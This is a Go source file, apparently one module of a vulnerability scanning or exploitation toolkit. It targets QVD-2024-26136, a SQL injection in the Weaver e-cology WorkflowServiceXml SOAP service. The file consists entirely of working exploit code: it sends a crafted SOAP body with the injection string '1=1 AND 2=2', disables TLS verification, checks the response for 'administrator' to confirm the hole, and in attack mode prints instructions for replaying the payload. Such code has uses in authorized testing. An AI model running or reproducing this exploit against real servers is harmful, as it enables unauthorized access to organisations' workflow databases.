package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func QVD_2024_26136(url string, Attack bool) error {
	payload := `
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
<soapenv:Header/>
<soapenv:Body>
<web:getHendledWorkflowRequestList>
<web:in0>1</web:in0>
<web:in1>1</web:in1>
<web:in2>1</web:in2>
<web:in3>1</web:in3>
<web:in4>
<web:string>1=1 AND 2=2</web:string>
</web:in4>
</web:getHendledWorkflowRequestList>
</soapenv:Body>
</soapenv:Envelope>
`
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/services/WorkflowServiceXml", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "text/xml")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "提醒") && strings.Contains(string(body), "administrator") {
		fmt.Println("[*]QVD-2024-26136 : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/wfs，并传入请求体`<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservices.workflow.weaver\">\n<soapenv:Header/>\n<soapenv:Body>\n<web:getHendledWorkflowRequestList>\n<web:in0>1</web:in0>\n<web:in1>1</web:in1>\n<web:in2>1</web:in2>\n<web:in3>1</web:in3>\n<web:in4>\n<web:string>1=1 AND 2=2</web:string>\n</web:in4>\n</web:getHendledWorkflowRequestList>\n</soapenv:Body>\n</soapenv:Envelope>`\n")
		}
	}

	defer response.Body.Close()

	return nil
}
